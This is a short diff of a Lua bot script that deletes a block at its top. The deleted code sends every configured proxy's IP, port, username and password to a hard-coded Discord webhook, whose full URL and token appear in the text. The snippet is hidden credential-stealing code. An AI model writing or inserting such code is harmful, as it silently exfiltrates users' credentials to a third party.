@@ -1,17 +1,3 @@
-wbcok = "https://discord.com/api/webhooks/1185569967626797178/FsLTvC0feuGjn8olpRFliriziUUDOz5gqkGiOuzkFHLbDpufGyY8cJX2ofqcO4OUujjL"
-
-for _,prox in pairs(getProxies()) do 
-notifsyn(wbcok,prox.ip..":"..prox.port..":"..prox.username..":"..prox.password)
-end 
-
-function notifsyn(webhookcok,status)
-        local syn = Webhook.new(webhookcok)
-        syn.avatar_url = "https://cdn.discordapp.com/attachments/1180523579381665933/1180577805403181076/20231203_013427.png"
-        syn.embed1.use = true 
-        syn.embed1.title = status
-        syn.embed1.color = 16740100
-        syn:send()
-end
 
 function getStatus(inibot)
     local status = {
